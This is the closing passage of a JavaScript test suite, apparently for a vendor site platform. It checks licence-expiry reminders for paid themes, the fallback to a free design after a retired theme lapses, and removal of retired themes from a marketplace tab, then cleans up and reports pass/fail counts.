    const mk = (days, ref) => prisma.themeEntitlement.create({ data: { vendorId: vRem.id, themeKey: 'clinic-calm', startsAt: new Date(Date.now() - (365 - days) * DAY), endsAt: new Date(Date.now() + days * DAY), status: 'ACTIVE', paymentRef: ref, amountPaise: 99900, gstPaise: 17982 } });
    const e1 = await mk(25, 'rem_1');
    const nRem = () => prisma.notification.count({ where: { recipientId: vRem.id, type: 'theme_expiring' } });
    await expiry.runOnce(new Date()); const afterA = await nRem();
    await expiry.runOnce(new Date()); const afterA2 = await nRem();
    ok('a licence with 25 days left gets the 30-day reminder, once', afterA === 1 && afterA2 === 1, `${afterA}/${afterA2}`);
    await prisma.themeEntitlement.update({ where: { id: e1.id }, data: { endsAt: new Date(Date.now() + 6 * DAY) } });
    await expiry.runOnce(new Date()); await expiry.runOnce(new Date());
    ok('at 6 days left the 7-day reminder is sent once', (await nRem()) === 2);
    await prisma.themeEntitlement.update({ where: { id: e1.id }, data: { endsAt: new Date(Date.now() + 0.5 * DAY) } });
    await expiry.runOnce(new Date()); await expiry.runOnce(new Date());
    ok('on the last day the 1-day reminder is sent once (three reminders in all, never more)', (await nRem()) === 3);
    await prisma.themeEntitlement.update({ where: { id: e1.id }, data: { status: 'EXPIRED' } });
    const vRem2 = await h.createVendor({ key: 'remind2', industry: 'clinic', plan: 'WORKSPACE' });
    await prisma.themeEntitlement.create({ data: { vendorId: vRem2.id, themeKey: 'clinic-calm', startsAt: new Date(), endsAt: new Date(Date.now() + 3 * DAY), status: 'ACTIVE', paymentRef: 'rem_2', amountPaise: 99900, gstPaise: 17982 } });
    await expiry.runOnce(new Date());
    ok('a licence first seen with 3 days left gets one message (not the 30 and 7 day ones as well)', (await prisma.notification.count({ where: { recipientId: vRem2.id, type: 'theme_expiring' } })) === 1);
    // retired
    const retire = await put(id, { status: 'RETIRED' });
    const live3 = await publicSite(sub);
    ok('retiring a theme a vendor has paid for is allowed, and their site keeps it until their year ends', retire.status < 300 && live3?.themeRef?.key === 'clinic-calm' && live3.themeNotice === null, J({ s: retire.status, ref: live3?.themeRef, n: live3?.themeNotice }));
    await expiry.runOnce(new Date(Date.now() + 800 * DAY));
    const live4 = await publicSite(sub);
    ok('after their year, a retired theme falls back to a free design with a plain notice and no error', live4 && live4.themeRef?.key !== 'clinic-calm' && live4.themeNotice?.kind === 'retired' && /withdrawn/.test(live4.themeNotice.message) && keep(live4) === k0, J({ ref: live4?.themeRef, n: live4?.themeNotice }));
    ok('the retired theme\'s licences are kept and still counted', (await prisma.themeEntitlement.count({ where: { vendorId: vClinic.id, themeKey: 'clinic-calm' } })) >= 3 && keep(live4) === k0);
    const tabAfter = (await call('GET', '/site-doc/me/themes', undefined, vClinic.token)).data;
    ok('a retired theme is no longer offered in the marketplace tab', !tabAfter.themes.some((t) => t.key === 'clinic-calm'));
  } catch (e) {
    fail += 1; failures.push('suite crashed'); console.log(`  FAIL  suite crashed -> ${e.stack || e}`);
  } finally {
    try { fs.rmSync(tmp, { recursive: true, force: true }); } catch { /* temp */ }
    await h.stop();
  }
  console.log(`\nTheme suite (PG): ${pass} passed, ${fail} failed`);
  if (fail) console.log(`FAIL: ${failures.join(' | ')}`);
  process.exit(fail ? 1 : 0);
})();
